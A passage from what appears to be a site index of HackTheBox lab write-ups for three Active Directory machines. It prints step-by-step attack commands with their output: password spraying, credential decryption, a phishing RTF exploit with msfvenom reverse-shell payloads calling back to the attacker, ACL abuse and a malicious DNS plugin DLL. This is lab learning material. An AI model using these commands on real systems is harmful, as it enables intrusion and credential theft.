N/A\n</code></pre> <p>Get users with a null session via <code>rpcclient</code> and make a list</p> <pre><code>$ rpcclient -U '' -N 10.10.10.172\nrpcclient $&gt; enumdomusers\nuser:[Guest] rid:[0x1f5]\nuser:[AAD_987d7f2f57d2] rid:[0x450]\nuser:[mhope] rid:[0x641]\nuser:[SABatchJobs] rid:[0xa2a]\nuser:[svc-ata] rid:[0xa2b]\nuser:[svc-bexec] rid:[0xa2c]\nuser:[svc-netapp] rid:[0xa2d]\nuser:[dgalanos] rid:[0xa35]\nuser:[roleary] rid:[0xa36]\nuser:[smorgan] rid:[0xa37]\n</code></pre> <pre><code>$ cat users | awk -F[][] '{print $2}' | sponge users\n</code></pre> <p>A user has an important description</p> <pre><code>rpcclient $&gt; querydispinfo\nindex: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.\n</code></pre> <p>Using <code>nxc</code> we find that <code>SABatchJobs</code> uses the same password as the name.</p> <p></p> <p>Looking at the shares, the user can read some folders.</p> <p></p> <p>In the <code>users</code> folder, the user <code>mhope</code> has an <code>azure.xml</code> file</p> <p></p> <pre><code>$ cat azure.xml                \n\ufffd\ufffd&lt;Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\"&gt;\n  &lt;Obj RefId=\"0\"&gt;\n    &lt;TN RefId=\"0\"&gt;\n      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;\n      &lt;T&gt;System.Object&lt;/T&gt;\n    &lt;/TN&gt;\n    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;\n    &lt;Props&gt;\n      &lt;DT N=\"StartDate\"&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;\n      &lt;DT N=\"EndDate\"&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;\n      &lt;G N=\"KeyId\"&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;\n      &lt;S N=\"Password\"&gt;4n0therD4y@n0th3r$&lt;/S&gt;\n    &lt;/Props&gt;\n  &lt;/Obj&gt;\n&lt;/Objs&gt;\n</code></pre> <p>So <code>mhope:4n0therD4y@n0th3r$</code></p> <pre><code>$ nxc winrm 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$\nWINRM       10.10.10.172    5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)\nWINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\\mhope:4n0therD4y@n0th3r$ (Pwn3d!)\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"monteverde/#initial-access","title":"Initial Access","text":"<p>Using the found credentials, use <code>evil-winrm</code> to access the machine</p> <pre><code>$ evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$\n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; whoami\nmegabank\\mhope\n</code></pre> <p>Get the flag</p> <pre><code>*Evil-WinRM* PS C:\\Users\\mhope\\desktop&gt; type user.txt\nfaea87344cd9b77a1fddc48abc6a62da\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"monteverde/#privilege-escalation","title":"Privilege Escalation","text":"<p><code>mhope</code> belongs to the Azure Admins group and the system has Azure AD Sync and a database installed, so:</p> <pre><code>*Evil-WinRM* PS C:\\program files&gt; ls\n    Directory: C:\\program files\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect\nd-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader\nd-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent\nd-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync\n</code></pre> <p>Searching for an exploit, we find https://github.com/VbScrub/AdSyncDecrypt. Download the files and upload them to the machine, then, following the instructions, execute the exe.</p> <pre><code>*Evil-WinRM* PS C:\\Program Files\\Microsoft Azure AD Sync\\Bin&gt; C:\\users\\mhope\\addecrypt.exe -FullSQL\n\n======================\nAZURE AD SYNC CREDENTIAL DECRYPTION TOOL\nBased on original code from: https://github.com/fox-it/adconnectdump\n======================\n\nOpening database connection...\nExecuting SQL commands...\nClosing database connection...\nDecrypting XML...\nParsing XML...\nFinished!\n\nDECRYPTED CREDENTIALS:\nUsername: administrator\nPassword: d0m@in4dminyeah!\nDomain: MEGABANK.LOCAL\n</code></pre> <p><code>administrator:d0m@in4dminyeah!</code></p> <p>Re-enter as <code>administrator</code> via <code>evil-winrm</code></p> <pre><code>$ evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'\n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoami\nmegabank\\administrator\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"monteverde/#post-exploitation","title":"Post Exploitation","text":"<pre><code>*Evil-WinRM* PS C:\\Users\\Administrator\\desktop&gt; type root.txt\n6fb5178cc58500def2e5ede28a86cc0d\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"reel/","title":"Reel","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"reel/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.10.77\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 00:13 CET\nNmap scan report for 10.10.10.77\nHost is up (0.043s latency).\nNot shown: 65527 filtered tcp ports (no-response)\nPORT      STATE SERVICE      VERSION\n21/tcp    open  ftp          Microsoft ftpd\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_05-28-18  11:19PM       &lt;DIR&gt;          documents\n| ftp-syst: \n|_  SYST: Windows_NT\n22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)\n| ssh-hostkey: \n|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)\n|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)\n|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)\n25/tcp    open  smtp?\n| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP\n|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: \n|     220 Mail Service ready\n|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: \n|     220 Mail Service ready\n|     sequence of commands\n|     sequence of commands\n|   Hello: \n|     220 Mail Service ready\n|     EHLO Invalid domain address.\n|   Help: \n|     220 Mail Service ready\n|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY\n|   SIPOptions: \n|     220 Mail Service ready\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|   TerminalServerCookie: \n|     220 Mail Service ready\n|_    sequence of commands\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)\n593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n49159/tcp open  msrpc        Microsoft Windows RPC\nService Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:0:2: \n|_    Message signing enabled and required\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n| smb-os-discovery: \n|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)\n|   OS CPE: cpe:/o:microsoft:windows_server_2012::-\n|   Computer name: REEL\n|   NetBIOS computer name: REEL\\x00\n|   Domain name: HTB.LOCAL\n|   Forest name: HTB.LOCAL\n|   FQDN: REEL.HTB.LOCAL\n|_  System time: 2024-11-22T23:16:59+00:00\n| smb2-time: \n|   date: 2024-11-22T23:16:56\n|_  start_date: 2024-11-22T23:05:20\n|_clock-skew: mean: 1s, deviation: 2s, median: 0s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 232.76 seconds\n</code></pre> <p>We enter the <code>ftp</code> server with anonymous access and find a note and <code>.docx</code> files:</p> <pre><code>$ ftp 10.10.10.77\n150 Opening ASCII mode data connection.\n05-28-18  11:19PM                 2047 AppLocker.docx\n05-28-18  01:01PM                  124 readme.txt\n10-31-17  09:13PM                14581 Windows Event Forwarding.docx\n226 Transfer complete.\nftp&gt; prompt off\nInteractive mode off.\nftp&gt; mget *\n14581 bytes received in 00:00 (162.46 KiB/s)\n</code></pre> <p>The note says to send a person an <code>rtf</code> file and he will convert it, so there is a person that is going to execute <code>rtf</code> files.</p> <p>Using <code>exiftool</code> on the files, we find an email address:</p> <pre><code>$ exiftool Windows\\ Event\\ Forwarding.docx \n...\nZip File Name                   : [Content_Types].xml\nCreator                         : nico@megabank.com\nRevision Number                 : 4\n...\n</code></pre> <p>So this person's email is <code>nico@megabank.com</code>.</p> <p>Now we can enumerate the <code>smtp</code> service and check if this email is valid:</p> <pre><code>$ smtp-user-enum -M RCPT -D megabank.com -u nico -t 10.10.10.77\nStarting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )\n\n ----------------------------------------------------------\n|                   Scan Information                       |\n ----------------------------------------------------------\n\nMode ..................... RCPT\nWorker Processes ......... 5\nTarget count ............. 1\nUsername count ........... 1\nTarget TCP port .......... 25\nQuery timeout ............ 5 secs\nTarget domain ............ megabank.com\n\n######## Scan started at Sun Nov 24 07:36:58 2024 #########\n10.10.10.77: nico@megabank.com exists\n######## Scan completed at Sun Nov 24 07:36:58 2024 #########\n1 results.\n\n1 queries in 1 seconds (1.0 queries / sec)\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"reel/#initial-access","title":"Initial Access","text":"<p>Let's create a malicious <code>rtf</code> and send it to <code>nico</code> using the <code>smtp</code> server.</p> <p>Using <code>searchsploit</code>, we get an interesting exploit:</p> <p></p> <p>Generate the <code>rtf</code>:</p> <pre><code>$ python2 41894.py -M gen -w yes.rtf -u http://10.10.14.11:8000/bad.hta            \nGenerating normal RTF payload.\n\nGenerated yes.rtf successfully\n</code></pre> <p>Generate the <code>hta</code> with <code>msfvenom</code>:</p> <pre><code>$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.11 lport=443 -f hta-psh -o bad.hta\n</code></pre> <p>Now, using <code>sendEmail</code>, we send the <code>yes.rtf</code> to <code>nico</code> and create a listener on port <code>443</code>:</p> <pre><code>$ sendEmail -t nico@megabank.com -u open -m yes -a yes.rtf -s 10.10.10.77 -f paco@megabank.com\nNov 24 08:04:58 kali sendEmail[861336]: Email was sent successfully!\n</code></pre> <p>Start a listener and a Python server and wait for <code>nico</code> to open the mail:</p> <pre><code>$ rlwrap nc -lnvp 443\nlistening on [any] 443 ...\nconnect to [10.10.14.11] from (UNKNOWN) [10.10.10.77] 63152\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\nico&gt;whoami\nnico\n</code></pre> <p>Get the flag:</p> <pre><code>C:\\Users\\nico\\Desktop&gt;type user.txt\ntype user.txt\n3d2c48a0d4a7fab39ef9536da3109a84\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"reel/#privilege-escalation","title":"Privilege Escalation","text":"<p>In the same folder, we have <code>cred.xml</code> that shows an XML created with PowerShell <code>Export-CliXml</code>:</p> <pre><code>C:\\Users\\nico\\Desktop&gt;type cred.xml\ntype cred.xml                                                                                                                \n&lt;Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\"&gt;\n  &lt;Obj RefId=\"0\"&gt;                                                                                                            \n    &lt;TN RefId=\"0\"&gt;                                                                                                           \n      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;                                                                       \n      &lt;T&gt;System.Object&lt;/T&gt;                                                                                                   \n    &lt;/TN&gt;                                                                                                                    \n    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;                                                           \n    &lt;Props&gt;                                                                                                                  \n      &lt;S N=\"UserName\"&gt;HTB\\Tom&lt;/S&gt;                                                                                            \n      &lt;SS N=\"Password\"&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692&lt;/SS&gt;       \n    &lt;/Props&gt;                                                                                                                 \n  &lt;/Obj&gt;                                                                                                                     \n&lt;/Objs&gt;            \n</code></pre> <p>So we get the password in plain text using <code>clixml</code>:</p> <pre><code>C:\\Users\\nico\\Desktop&gt;powershell -c \"$cred=Import-CliXml -Path .\\cred.xml; $cred.GetNetworkCredential() | Format-List *\"\npowershell -c \"$cred=Import-CliXml -Path .\\cred.xml;$pass=$cred.GetNetworkCredential().Password;Write-Output $pass\"\nUserName    : Tom\nPassword    : 1ts-mag1c!!!\n</code></pre> <p>And we have <code>tom:1ts-mag1c!!!</code>.</p> <p>Let's try <code>ssh</code>:</p> <pre><code>$ sshpass -p '1ts-mag1c!!!' ssh tom@10.10.10.77\nMicrosoft Windows [Version 6.3.9600]                                                                                         \n(c) 2013 Microsoft Corporation. All rights reserved.                                                                         \n\ntom@REEL C:\\Users\\tom&gt;whoami /priv                                                                                           \n\nPRIVILEGES INFORMATION                                                                                                       \n----------------------                                                                                                       \n\nPrivilege Name                Description                    State                                                           \n============================= ============================== =======                                                         \nSeMachineAccountPrivilege     Add workstations to domain     Enabled                                                         \nSeLoadDriverPrivilege         Load and unload device drivers Enabled                                                         \nSeShutdownPrivilege           Shut down the system           Enabled                                                         \nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                         \nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled    \n</code></pre> <p>There is a file inside an audit folder:</p> <pre><code>$ scp tom@10.10.10.77:'/C:/Users/tom/Desktop/AD Audit/BloodHound/Ingestors/acls.csv' .\ntom@10.10.10.77's password: \nacls.csv\n</code></pre> <p>Open the file and search for <code>tom</code>:</p> <p></p> <p>And <code>tom</code> has <code>WriteOwner</code> permissions over <code>claire</code>, so:</p> <p>The ability to set the object owner is abusable by <code>Set-DomainObjectOwner</code>. The ability to write to the DACL is abusable by <code>Add-DomainObjectAcl</code>. The ability to reset a user\u2019s password is abusable by <code>Set-DomainUserPassword</code>.</p> <pre><code>PS C:\\Users\\tom\\Desktop\\AD Audit\\BloodHound&gt; Import-Module .\\PowerView.ps1                                                   \nPS C:\\Users\\tom\\Desktop\\AD Audit\\BloodHound&gt; Set-DomainObjectOwner -Identity claire -OwnerIdentity tom                       \nPS C:\\Users\\tom\\Desktop\\AD Audit\\BloodHound&gt; Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword                                 \nPS C:\\Users\\tom\\Desktop\\AD Audit\\BloodHound&gt; $pass = ConvertTo-SecureString 'Sup3rS3cr3t!' -AsPlainText -Force               \nPS C:\\Users\\tom\\Desktop\\AD Audit\\BloodHound&gt; Set-DomainUserPassword -Identity claire -AccountPassword $pass\n</code></pre> <p>Now <code>ssh</code> with <code>claire</code>:</p> <pre><code>$ ssh claire@10.10.10.77\nMicrosoft Windows [Version 6.3.9600]                                                                                         \n(c) 2013 Microsoft Corporation. All rights reserved.                                                                         \n\nclaire@REEL C:\\Users\\claire&gt;whoami\nclaire\n</code></pre> <p><code>claire</code> has <code>writedacl</code> over <code>backup_admins</code> group, so:</p> <pre><code>net group backup_admins claire /add\n</code></pre> <p>Now we can go to the <code>administrator</code> folder and there are multiple scripts in the backup scripts folder:</p> <pre><code>PS C:\\Users\\Administrator\\Desktop\\Backup Scripts&gt; dir | Select-String \"Password\"                                             \n\nBackupScript.ps1:1:# admin password                                                                                          \nBackupScript.ps1:2:$password=\"Cr4ckMeIfYouC4n!\"     \n</code></pre> <p>Try <code>administrator</code> with this password and:</p> <pre><code>$ sshpass -p 'Cr4ckMeIfYouC4n!' ssh Administrator@10.10.10.77\nMicrosoft Windows [Version 6.3.9600]                                                                                         \n(c) 2013 Microsoft Corporation. All rights reserved.\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"reel/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag:</p> <pre><code>administrator@REEL C:\\Users\\Administrator&gt;type Desktop\\root.txt                                                              \n4dbdf359b13068dbccc394fef88b5b82\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"resolute/","title":"Resolute","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"resolute/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -sC -sV -Pn -T4 --min-rate 1000 -p- 10.10.10.169\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 21:00 CET\nNmap scan report for 10.10.10.169\nHost is up (0.045s latency).\nNot shown: 65512 closed tcp ports (reset)\nPORT      STATE SERVICE      VERSION\n53/tcp    open  tcpwrapped\n88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-20 19:56:04Z)\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf       .NET Message Framing\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc        Microsoft Windows RPC\n49665/tcp open  msrpc        Microsoft Windows RPC\n49666/tcp open  msrpc        Microsoft Windows RPC\n49668/tcp open  msrpc        Microsoft Windows RPC\n49671/tcp open  msrpc        Microsoft Windows RPC\n49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n49677/tcp open  msrpc        Microsoft Windows RPC\n49688/tcp open  msrpc        Microsoft Windows RPC\n49819/tcp open  tcpwrapped\nService Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2024-11-20T19:56:56\n|_  start_date: 2024-11-20T19:51:31\n| smb-os-discovery: \n|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n|   Computer name: Resolute\n|   NetBIOS computer name: RESOLUTE\\x00\n|   Domain name: megabank.local\n|   Forest name: megabank.local\n|   FQDN: Resolute.megabank.local\n|_  System time: 2024-11-20T11:56:55-08:00\n|_clock-skew: mean: 2h34m33s, deviation: 4h37m10s, median: -5m27s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 92.75 seconds\n</code></pre> <p>Add <code>megabank.local</code> to <code>/etc/hosts</code></p> <p>We find a password hardcoded in the description of a user using <code>enum4linux-ng</code></p> <pre><code>=====================================\n|    Users via RPC on 10.10.10.169    |\n =====================================\n[*] Enumerating users via 'querydispinfo'\n[+] Found 27 user(s) via 'querydispinfo'\n[*] Enumerating users via 'enumdomusers'\n[+] Found 27 user(s) via 'enumdomusers'\n[+] After merging user results we have 27 user(s) total:\n'10101':                                                                                        \n  username: melanie                                                                             \n  name: (null)                                                                                  \n  acb: '0x00000010'                                                                             \n  description: (null)                                                                           \n'10102':                                                                                        \n  username: zach                                                                                \n  name: (null)                                                                                  \n  acb: '0x00000010'                                                                             \n  description: (null)                                                                           \n'10103':                                                                                        \n  username: simon                                                                               \n  name: (null)                                                                                  \n  acb: '0x00000010'                                                                             \n  description: (null)                                                                           \n'10104':                                                                                        \n  username: naoki                                                                               \n  name: (null)                                                                                  \n  acb: '0x00000010'                                                                             \n  description: (null)                                                                           \n'1105':                                                                                         \n  username: ryan                                                                                \n  name: Ryan Bertrand                                                                           \n  acb: '0x00000210'                                                                             \n  description: (null)                                                                           \n'1111':                                                                                         \n  username: marko                                                                               \n  name: Marko Novak                                                                             \n  acb: '0x00000210'                                                                             \n  description: Account created. Password set to Welcome123!                                     \n'500':                                                      \n</code></pre> <p>We have <code>marko:Welcome123!</code></p> <p>Check the password with all users and we find <code>melanie:Welcome123!</code></p> <pre><code>$ crackmapexec smb 10.10.10.169 -u users2 -p 'Welcome123!' \n\nSMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)\nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\Administrator:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\Guest:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\krbtgt:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\ryan:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\marko:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\sunita:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\abigail:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\marcus:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\sally:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\fred:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\angela:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\felicia:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\gustavo:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\ulf:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\stevie:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\claire:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\paulo:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\steve:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\annette:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\annika:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\per:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\\claude:Welcome123! STATUS_LOGON_FAILURE \nSMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\\melanie:Welcome123!\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"resolute/#initial-access","title":"Initial Access","text":"<p>Enter the host using <code>evil-winrm</code></p> <pre><code>$ evil-winrm -u melanie -p 'Welcome123!' -i 10.10.10.169\n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\melanie\\Documents&gt;\n</code></pre> <p>Get the flag</p> <pre><code>*Evil-WinRM* PS C:\\Users\\melanie\\Desktop&gt; type user.txt\n2cbc3d50e90f2717a55d2204fa02626c\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"resolute/#privilege-escalation","title":"Privilege Escalation","text":"<p>While enumerating the filesystem, I found a PowerShell history file in <code>C:\\PSTranscripts\\20191203\\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</code></p> <p>Make it visible before downloading it or <code>evil-winrm</code> will fail</p> <pre><code>attrib -h C:\\PSTranscripts\\20191203\\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt\n</code></pre> <pre><code>$ cat aaa.txt       \n**********************\n...\n**********************\nPS&gt;ParameterBinding(Out-String): name=\"InputObject\"; value=\"PS megabank\\ryan@RESOLUTE Documents&gt; \"\nPS megabank\\ryan@RESOLUTE Documents&gt;\n**********************\nCommand start time: 20191203063515\n**********************\nPS&gt;CommandInvocation(Invoke-Expression): \"Invoke-Expression\"\n&gt;&gt; ParameterBinding(Invoke-Expression): name=\"Command\"; value=\"cmd /c net use X: \\\\fs01\\backups ryan Serv3r4Admin4cc123!\n...\n</code></pre> <p>So <code>ryan:Serv3r4Admin4cc123!</code></p> <p>Test it with <code>cme</code></p> <pre><code>$ crackmapexec smb 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!'\nSMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)\nSMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\\ryan:Serv3r4Admin4cc123! (Pwn3d!)\n</code></pre> <p>We can see the permissions of this user</p> <pre><code>*Evil-WinRM* PS C:\\Windows\\System32&gt; whoami /groups\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                 Type             SID                                            Attributes\n========================================== ================ ============================================== ===============================================================\n...\nMEGABANK\\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group\nNT AUTHORITY\\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Mandatory Level     Label            S-1-16-8192\n</code></pre> <p>We can see that this user belongs to the <code>DnsAdmins</code> group. This group can execute and manage DNS on the DC. https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/ So we can search for the program in <code>system32</code> called <code>dnscmd.exe</code>.</p> <p>Also, there is a note on his desktop:</p> <pre><code>cat note.txt\nEmail to team:\n\n- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute\n</code></pre> <p>With <code>dnscmd.exe</code> we can load a DLL plugin that is a reverse shell.</p> <p>So, create the shell</p> <pre><code>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9090 -f dll -o reverse.dll\n</code></pre> <p>Start an SMB share and start a listener.</p> <pre><code>$ impacket-smbserver s .\n</code></pre> <p>Now execute the setting of the DLL and stop and start the service for the program to load it.</p> <pre><code>*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\\\10.10.14.11\\s\\reverse.dll\n\nRegistry property serverlevelplugindll successfully reset.\nCommand completed successfully.\n\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; sc.exe stop dns\n\nSERVICE_NAME: dns\n        TYPE               : 10  